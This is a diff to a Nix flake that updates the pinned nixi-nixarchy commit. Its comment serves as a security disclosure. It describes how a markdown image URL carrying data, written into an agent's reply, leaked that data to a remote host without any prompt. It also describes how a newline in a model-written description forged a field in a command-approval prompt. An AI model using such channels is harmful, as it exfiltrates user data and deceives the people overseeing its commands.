@@ -213,9 +213,33 @@
     #
     # The previous pin, 4e6c1b5, was nixi-nixarchy#37/#43 (summon action
     # "ask").
-    # This one is nixi-nixarchy#84: MenuSearch imports MenuModel.js from a
-    # build-time store copy of our Omarchy (#1070), which is why `omarchy`
-    # follows ours.
+    # The pin before this one, d99e335, was nixi-nixarchy#84: MenuSearch imports
+    # MenuModel.js from a build-time store copy of our Omarchy (#1070), which is
+    # why `omarchy` follows ours.
+    # This one is nixi-nixarchy#88 on top of #87, and it carries a fix for
+    # something every machine on the previous pin does. BEFORE it, the card
+    # FETCHED remote images named in an agent reply: a reply holding
+    # `![](http://host/x.png?data=...)` produced that request at GUIDE, with no
+    # prompt and no tool call, so none of Guide's defences engaged. Measured
+    # against a listener on loopback, which logged the query string intact. It is
+    # reported privately on nixi's repository; this pin is what carries the fix.
+    # An image now renders only from a local file inside nixi's own image
+    # directory; anything else becomes its alt text.
+    # The rest of what a user sees:
+    # - answers can carry tables, images and charts, and the chart is drawn by
+    #   nixi's own bridge rather than the agent, so it works at GUIDE -- where
+    #   the agent may not write a file at all (#86/#87)
+    # - the permission prompt is readable again: three options used to overlap
+    #   into a smear, the command was printed twice, and a one-line description
+    #   cost three lines of JSON (#88)
+    # - a permission value can no longer forge a field line -- a model-written
+    #   `description` holding a newline printed a second `timeout:` above the
+    #   real one, in the prompt someone reads before approving a command (#88)
+    # - desktop control through ai-mirror exists, at Mechanic and on Claude
+    #   only, and OFF unless `services.nixi.aiMirror.package` is set. nixarchy
+    #   passes no package, so this bump does not turn it on; whether it should
+    #   ride `programs.nixarchy.aiMirror.mcp` is #1169's open question and
+    #   spec/2026-09-22-773-ai-mirror-default.md's subject.
     # It also carries nixi-nixarchy#36-#83:
     # - adapters pin their commands and read project config (#73, #76/#78, #80, #83)
     # - permission prompts: allow-always, fidelity, the trust-pending wedge (#46, #58, #65)
@@ -225,7 +249,7 @@
     # - menu writes escalate safely, learned visibility, and drift fixes (#54, #59, #61, #72)
     # - one ack event, a tour file-watch reload, agent settings sources (#45, #66, #71), plus a flake.lock update (#82)
     nixi = {
-      url = "github:olafkfreund/nixi-nixarchy/d99e335b541d5d71611fff74b49acbe60d7a2e6b";
+      url = "github:olafkfreund/nixi-nixarchy/245e2a34d65cba9c569712264ff1cff62782fccb";
       inputs.nixpkgs.follows = "nixpkgs";
       inputs.omarchy.follows = "omarchy";
     };
